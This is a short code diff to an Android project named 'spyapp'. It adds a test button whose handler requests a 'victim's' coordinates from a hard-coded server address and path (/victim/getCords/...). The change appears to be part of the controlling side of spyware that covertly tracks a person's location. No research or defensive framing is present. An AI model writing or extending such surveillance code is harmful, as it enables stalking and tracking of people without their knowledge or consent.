@@ -11,6 +11,7 @@ import android.graphics.Color;
 import android.os.AsyncTask;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -28,6 +29,7 @@ public class MainActivity extends AppCompatActivity {
     private Button logbutton;
     private Button signupbutton;
     private ServerRequest req;
+    private Button cordsTest;
 
     public static final String BROADCAST_ACTION = "com.example.albert.spyapp;";
     private Permission permission;
@@ -43,6 +45,8 @@ public class MainActivity extends AppCompatActivity {
         password = (EditText)findViewById(R.id.passwordtextfield);
         signupbutton = (Button)findViewById(R.id.signupbutton);
         error = (TextView)findViewById(R.id.error);
+        cordsTest=(Button)findViewById(R.id.testCords);
+
         logbutton.setOnClickListener(new View.OnClickListener() {
             @SuppressLint("StaticFieldLeak")
             @Override
@@ -77,6 +81,15 @@ public class MainActivity extends AppCompatActivity {
                         startActivity(i);
                     }
                 }
+            }
+        });
+
+        cordsTest.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.d("test clicked","clicked");
+                CordsRequest request=new CordsRequest("http://35.204.80.21:4567/victim/getCords/albi",getApplicationContext());
+                request.getCords();
             }
         });
       
